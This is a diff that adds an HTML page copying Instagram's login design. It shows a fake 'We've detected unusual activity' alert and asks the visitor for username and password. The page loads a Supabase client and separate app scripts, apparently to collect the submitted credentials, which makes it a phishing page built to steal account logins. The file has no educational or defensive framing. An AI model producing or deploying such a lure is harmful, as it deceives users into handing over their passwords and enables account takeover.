@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <a href="https://instagram.com" target="_blank" class="logo-link">
+                <img src="logo.png" alt="Instagram" class="logo">
+            </a>
+            <div class="header-actions">
+                <button class="btn-login">Log In</button>
+                <a href="#" class="link-signup">Sign Up</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <div class="card">
+            <!-- Lock Icon -->
+            <div class="lock-icon">
+                <svg width="96" height="96" viewBox="0 0 96 96" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="48" cy="48" r="44"></circle>
+                    <!-- Lock body -->
+                    <rect x="36" y="52" width="24" height="20" rx="2"></rect>
+                    <!-- Lock shackle (open) -->
+                    <path d="M36 52C36 44 40 38 48 38C56 38 60 44 60 52"></path>
+                </svg>
+            </div>
+
+            <!-- Title -->
+            <h1 class="card-title">We've detected unusual activity</h1>
+
+            <!-- Description -->
+            <p class="card-description">
+                Please log in to confirm it's you.
+            </p>
+
+            <!-- Form -->
+            <form class="card-form" id="loginForm">
+                <input 
+                    type="text" 
+                    id="username"
+                    class="input-field" 
+                    placeholder="Email, Phone, or Username"
+                    required
+                >
+                <input 
+                    type="password" 
+                    id="password"
+                    class="input-field" 
+                    placeholder="Password"
+                    required
+                >
+                <button type="submit" class="btn-primary">Log In</button>
+            </form>
+            <div id="message" style="margin-top: 10px; text-align: center; color: #ed4956;"></div>
+
+            <!-- Help Link -->
+            <a href="#" class="link-help">¿Can't reset your password?</a>
+
+            <!-- Divider -->
+            <div class="divider">
+                <span class="divider-line"></span>
+                <span class="divider-text">OR</span>
+                <span class="divider-line"></span>
+            </div>
+
+            <!-- Create Account Link -->
+            <a href="#" class="link-create">Create new account</a>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Meta AI Articles</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <div class="language-selector">
+                <span>English</span>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                </svg>
+            </div>
+            <div class="copyright">© 2025 Instagram from Meta</div>
+        </div>
+    </footer>
+    
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
+
